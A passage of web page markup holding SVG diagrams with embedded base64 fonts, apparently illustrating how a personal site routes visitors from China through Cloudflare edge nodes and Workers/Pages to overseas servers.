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)}.connection,.shape{stroke-linejoin:round}.shape{shape-rendering:geometricPrecision}.connection{stroke-linecap:round}.d2-3522806805 .fill-N1{fill:#170206}.d2-3522806805 .stroke-B1{stroke:#023324}</style><g id="china"><g class="shape"><path d="M12 70h102v66H12z" class="stroke-B1" style="fill:#ebfdf7;stroke-width:2"/></g><text x="63" y="108.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">国内 IP</text></g><g id="cf" class="cf-box"><path fill="#fff8dc" stroke="#deb887" d="M338 12h436v211H338z" class="shape" style="stroke-width:2"/><text x="556" y="45" class="fill-N1" style="font-family:'d2-3522806805-font-regular';text-anchor:middle;font-size:28px">Cloudflare</text></g><g id="server"><path fill="#add8e6" stroke="#00008b" d="M849 33h185v66H849z" class="shape" style="stroke-width:2"/><text x="941.5" y="71.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">其他境外服务器</text></g><g id="cf.edge" class="cf-box"><path fill="#fff8dc" stroke="#deb887" d="M388 62h84v82h-84z" class="shape" style="stroke-width:2"/><text x="430" y="100.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px"><tspan x="430" dy="0">边缘</tspan><tspan x="430" dy="18.5">节点</tspan></text></g><g id="cf.worker" class="cf-box"><path fill="#fff8dc" stroke="#deb887" d="M552 107h172v66H552z" class="shape" style="stroke-width:2"/><text x="638" y="145.5" class="text-bold fill-N1" style="text-anchor:middle;font-size:16px">CF Worker / Pages</text></g><g id="cf.(edge -&gt; worker)[0]" class="cf-box"><marker id="mk-1790844558" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path fill="#deb887" stroke-width="2" d="m0 0 10 6-10 6z" class="connection"/></marker><path fill="none" stroke="#deb887" marker-end="url(#mk-1790844558)" d="M474 116.666h28s10 0 10 10V130s0 10 10 10h26" class="connection" mask="url(#d2-3522806805)" style="stroke-width:2"/></g><g id="(cf.edge -&gt; server)[0]"><marker id="mk-1194891051" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path fill="#add8e6" stroke-width="2" d="m0 0 10 6-10 6z" class="connection"/></marker><path fill="none" stroke="#add8e6" marker-end="url(#mk-1194891051)" d="M474 89.333h28s10 0 10-10V76s0-10 10-10h323" class="connection" mask="url(#d2-3522806805)" style="stroke-width:2;stroke-dasharray:6,5.919384"/></g><g id="(china -&gt; cf.edge)[0]"><marker id="mk-3488378134" markerHeight="12" markerUnits="userSpaceOnUse" markerWidth="10" orient="auto" refX="7" refY="6" viewBox="0 0 10 12"><path stroke-width="2" d="m0 0 10 6-10 6z" class="connection" style="fill:#023324"/></marker><path fill="none" marker-end="url(#mk-3488378134)" d="M116 103h268" class="connection stroke-B1" mask="url(#d2-3522806805)" style="stroke-width:2"/><text x="251.5" y="101" style="font-family:'d2-3522806805-font-italic';fill:#535152;text-anchor:middle;font-size:16px"><tspan x="251.5" dy="0">i.hsfzxjy.site</tspan><tspan x="251.5" dy="18.5">（快！）</tspan></text></g><mask id="d2-3522806805" width="1024" height="213" x="11" y="11" maskUnits="userSpaceOnUse"><path fill="#fff" d="M11 11h1024v213H11z"/><path fill="rgba(0,0,0,0.75)" d="M34.5 92.5h57v21h-57zM495.5 17h121v36h-121zM871.5 55.5h140v21h-140zM410.5 84.5h39v37h-39zM574.5 129.5h127v21h-127z"/><path d="M212 85h79v37h-79z"/></mask></svg></svg></figure><h1 id="本站优化后的网络拓扑">本站优化后的网络拓扑</h1><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="681" height="220" preserveAspectRatio="xMinYMin meet" viewBox="0 0 972 313"><svg id="d2-svg" width="972" height="313" class="d2-3332111211" viewBox="-198 11 972 313"><rect width="972" height="313" x="-198" y="11" stroke-width="0" rx="0" style="fill:#fff"/><style>@font-face{font-family:d2-3332111211-font-regular;src:url(data:application/font-woff;base64,d09GRgABAAAAAA+AAAoAAAAAFzgAAguFAAAAAAAAAAAAAAAAAAAAAAAAAABPUy8yAAAA9AAAAGAAAABgXd/Vo2NtYXAAAAFUAAAArgAAAOYEAgVLZ2x5ZgAAAgQAAAjGAAALoOdwC/VoZWFkAAAKzAAAADYAAAA2G4Ue32hoZWEAAAsEAAAAJAAAACQKhAXqaG10eAAACygAAACfAAAAoEa5Bx9sb2NhAAALyAAAAFIAAABSPw48em1heHAAAAwcAAAAIAAAACAAQAD2bmFtZQAADDwAAAMjAAAIFAbDVU1wb3N0AAAPYAAAAB0AAAAg/9EAMgADAgkBkAAFAAACigJYAAAASwKKAlgAAAFeADIBIwAAAgsFAwMEAwICBGAAAvcAAAADAAAAAAAAAABBREJPAEAAIP//Au7/BgAAA9gBESAAAZ8AAAAAAeYClAAAACAAA3icfM07K0YBAMbx3/Ee9+N+vx+XGclilGyy8AXIJKWUkq8j4QMYTPgaNqOBzfyoM5neZ3mWX/1RaClQKX2gViub37Bl245de/YdOnbq3KVrt0kj1m3+EweOnDhz4cpNks/85iff+cp73vKalzznKY95yH3ummb7FVatWbSktmxFh5ZSpy7devTq068yYNCQYSNGjRk3YdKUaTNmzZm3wB8AAAD//wEAAP//kBErNQAAeJxcVntsG3cd//5+vviS+pzkap/PdmyffZf4/Hbiu/Ml9Wtx7LyaxKnTrE3apO2aNWUlpQt7UNq1oI2tTEULbBMTDOh4SJvEpA2kPYSQ0GAlsGnSJNgDoWk8FCYNNhYytIrljO7shIS/fpbvp+/j8/l8P98fNMEMAFbwI2CCFmiDvcAASHSA7gqIokCqkqoKrEkVEU3OoD9qKwiNyEQ6TfQU3y+ev3wZHb6EH9n87L77Fhdfnr/7bu1ra+9pKfTae4DBBIC9eAVagAawkZIYDIqC2WyySTZBFMhXuJe5vf52os3/h3fm35nJf1hAn1tYUJf6+pa0WbyyeW51FQAAgVzbwB34cfACNPHBoCKn01LKwZLBoMCbzYzd4ZBSaZU1m1G1+uX9Y/dNZY964u5iJD8npY7kk6NcQryFOvDYmdseq/b40x6+/65q9XwxxMvxlBF/FgC9g1fAYvTNBBiJEZgAM4u+qL194wbqwSuDrw19MLR991W8Ak36Xf327BTi8Mrm80Ow9R3fg1f0WiVasjkcrJROqzaJFmg5rQqkSTCJgsPB0LMLlyiWIiiGunjrRLOJkC+qF2XCROIV7ft8mefLPJrfPIc+EzsTfVT7MTr4aPRMTPvmdo44XgFbPQcrBYMKLdHbkW/+xxBhIis3fzBEEHq8hSupMzKa2jyHvvNAz2lZewoQRGob6EP8OMQNTEXVwFCRg0FRTODdCOsAs6wPM3azGbWX74qmhGNS/7C3h5vncmFlPpNZEOK+kYQ6EEi554K5zvQCpcT2dcUz3XzI0xq2RordqUo83pn2BuQYF3ZbQu3x/h55OgUIPADoU7wCpN6LoAQYgf7zdfTudTw6OLj5nI4p1vlHz6J1cEMnAMvrAlBlozRSNAplaEEXlphKq4ohiJdyBx76Nh0NRUa9fv7kvpnJEmniDziEvHD+RIoa6Z+cprlewW/vc4SXjmhv7PNEijz3QFs2Ge4CDNXaBvoPXgUb+OvoCKRASwxZz2U3EimykZ9xOFCYH/GbyGIVByqhY7dkjg1mK5kyd5PgL1ABbwqvvnTYK95/+9Rd+fLi7ORJ3l/zsPW+krUN9PZWnnpfBuyiIm01pCrbIv/kyNnMCTWS9xNTJdLkGXPdlOX6fGIhOEh95Xzl83mfe+pnm719nnB5QPOwyaneQycBQ6K2gX6L1sEJ3K7pYexmMrA9OKaA0Q5i+2/LFxbUuVsR1l5oOjQoZDq8XOUVRBT6pANUbrkyuZy/eNrqahk/ytBpuw8FR8crhiZ9AKiAf1f3DkFRFbmhIIFn9HmijxeL5RE20r63w1NaXEQ/yDeNjx5qIQvU/PiANgcAJojX/OjvaB16IAfj20wrwR2HEVRidJ3bzWaBFw1opAYvpi1eGLvDVv8t8MH6nX/PnAsG9rp4m1NMHeyxd1qfWqDZ7smUyFv3dvXMT09nz45FctloNJtLDx6UkgdbA+1u5/53SwWuz0FYQh4uYSXspagyESGbCu0KJ4+FaUuHnfWpufhYEj1bUJRsVlEK2pVckHcThC3CiAkDmyoAehOvgt2Y1y0d6Y5gaIiuVk3CeGp8qBrr7sp04dWXFgLJE3Paqyhcyge7tGtQq0EZAH6Kn8NB6AIAMwQvAkCtVnurJsJPjP/F+v8X6j5UrW3AW3gV2uo40hJt3yL7qUS42tpCkKSl2UH1KfjU5iM2GqE8QdRrxR+hdQgYtermpSO+q2Jy+6yWSJN/LNpbaAtOxPaPVGOJdKkaS6ZLaG1QSPbEwvJWG/u1a41jCw+03sCjkWMnHiXSJExsA2IE24VHQ9f/ROvQBh27dL17Phm7A7VlFguFxUz2VKFwKlsYHy/kJyao7PJkdTmbXa5OLmdLi1MHT58+OLW4xdU8Wtc31nZtDR+sF+YaDnvZdsrexg240NrhRHrPMEGk8lpjV3lqG+hetA4RA/edvmrY6v+5at1UX5fnhbC/FO3uDkgdfDEyU4lPeEKutD8R9XV3CKV4uEKJHtUViHMunt1jDSjhTMXPyjZnxMN6GYs1oCbEYsjI76xtoDI+C2yDd0FRVckYwG3+35/IDY/tKd97byBi9VHt9iQ1O4ys+aYrVwa09XhPC5EnLUas/bUN9Bpa03napSG6YU/vjg9PRbuDGV7HhR+jTswhWXuzlBejaEZzj4W6AUErAHoGrYELQFJFiW0sRFUiWaHxHiDJ1u89PNNvcVoJi8OSufnh784MWd2thNVJFbX3ztgidnvEduajj293xBgmyt5u1EbVkujXaE1n/384q6ppx8o1teLZdi/V3mxvCafbLL+cPmlxWQiLfc+hyefpZPl1M9GPmzLxTvQ37V/cMB8Y9iPr5nr3WFyPzwGgh9AatABICtIXEwowHIK/orEaoOYYunsgpn11wPDxWG0DvYwfBMsW6nLDYXfq8MbxpaXjx5aWjvWWSr295TL19LUnnnzyiWtPFy9fvXrhwtWrl42+KgDoeXwJKD2v7qTptKqbRuUbd8T63YX7SugNpZlt37xequutEwD9Cj+o4yApedxYS+L2qtLNRmJCx+8fzOZCJU8ydCQ/c2rgzjF3r+vFnuNfv1NSB+P+ZExZnM5eeKCCiSHAuvbR7/ElaNGZVyXdfXWabEpAQXotAnN6lUAE5W6VtD8h+uihQ+svuoddbIzV5GfS6DHtjuIzOi6h2gb6hYFLCMBW146hfds2Y2lVd/Fdw3tnJuMf4pqHc4n+w9K4O2FXfbq/+iZD1ZPytFRY6CufRT/Pj4TicyfGNz8RPTLrkb9wKhg7eUvuqFy6svilxxtvsf7aBrwAy/q7bicr97gEweUUBEro8AqCt0PQ7+6pHUcH8HX9zcoiCe1Blqz28TXTqU+/BVseDj9Ea/p3/d1XraI1zQ2o9hs8Cip+Ts9B78jh5Dink+PwqNfl9PmcLi8AMrz6R2it4clb3qCPldnv6LLSLU5rp7Oafbu5KW9qkmLYu/mX0cP/BQAA//8BAAD//y/0cJgAAAABAAAAAguFrarapV8PPPUAAwPoAAAAANhdoKEAAAAA3WYvNv46/tsIbwPIAAAAAwACAAAAAAAAAAEAAAPY/u8AAAiY/jr+OghvAAEAAAAAAAAAAAAAAAAAAAAoeJwUzC9uwmAYx/Hv76lbli0zS0XTNVnF/kAxdQSBQCFIHsdLwnVQnALFJdCgEXACNK8pRZVwgY+tmbMHK0hsSG3vBF0IdiLYimCf/FlKppbafnH7Z6ArlUpytfStwGmYcOvOdHgywu0bt5xKC1wbMjmpFUy1401HXrXlS5GeIjNFSkU+FPnhzlhLXmhw6A5P8wEAAP//AQAA///GBiQDAAAAACwALABQAIAAlgCmANgA+gE+AVABiAG8Ae4CIgJEArAC0gLeAuoDBgM4A1oDhgOmA+YEDAQuBFoEigSgBMYE3gUIBSwFbAWCBZIFngW0BdAAAAABAAAAKACMAAwAZgAHAAEAAAAAAAAAAAAAAAAABAADeJyclN1OG1cUhT8H221UNRcVisgNOpdtlYzdCKIErkwJilWEU4/TH6mqNHjGP2I8M/IMUKo+QK/7Fn2LXPU5+hBVr6uzvA02qhSBELDOnL33WWevtQ+wyb9sUKs/BP5q/mC4xnZzz/ADHjWfGt7guPG34fpKTIO48ZvhJl82+oY/4n39D8Mfs1P/2fBDtupHhj/heX3T8Kcbjn8MP2KH9wtcg5f8brjGFoXhB2zyk+ENHmM1a3Ue0zbc4DO2DTfZBgZMqUiZkjHGMWLKmHPmJJSEJMyZMiIhxtGlQ0qlrxmRkGP8v18jQirmRKo4ocKREpISUTKxir8qK+etThxpNbe9DhUTIk6VcUZEhiNnTE5GwpnqVFQU7NGiRclQfAsqSgJKpqQE5MwZ06LHEccMmDClxHGkSp5ZSM6Iiksine8swndmSEJGaazOyYjF04lfouwuxzh6FIpdrXy8VuEpju+U7bnliv2KQL9uhdn6uUs2ERfqZ6qupNq5lIIT7fpzO3wrXLGHu1d/1pl8uEex/leqfMq59I+lVCYmGc5t0SGUg0L3BMeB1l1CdeR7ugx4Q493DLTu0KdPhxMGdHmt3B59HF/T44RDZXSFF3tHcswJP+L4hq5ifO3E+rNQLOEXCnN3KY5z3WNGoZ575oHumuiGd1fYz1C+5o5SOUPNkY900i/TnEWMzRWFGM7Uy6U3SutfbI6Y6S5e25t9Pw0XNnvLKb4i1wx7ty44eeUWjD6kanDLM5f6CYiIyTlVxJCcGS0qrsT7LRHnpDgO1b03mpKKznWOP+dKLkmYiUGXTHXmFPobmW9C4z5c872ztyRWvmd6dn2r+5zi1Ksbjd6pe8u90LqcrCjQMlXzFTcNxTUz7yeaqVX+oXJLvW45z+iTSPVUN7j9DjwnoM0Ou+wz0TlD7VzYG9HWO9HmFfvqwRmJokZydWIVdgl4wS67vOLFWs0OhxzQY/8OHBdZPQ54fWtnXadlFWd1/hSbtvg6nl2vXt5br8/v4MsvNFE3L2Nf2vhuX1i1G/+fEDHzXNzW6p3cE4L/AAAA//8BAAD//wdbTDAAeJxiYGYAg//nGIwYsAAAAAAA//8BAAD//y8BAgMAAAA=)}.d2-3332111211 .text-bold{font-family:'d2-3332111211-font-bold'}@font-face{font-family:d2-3332111211-font-bold;src:url(data:application/font-woff;base64,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)}.d2-3332111211 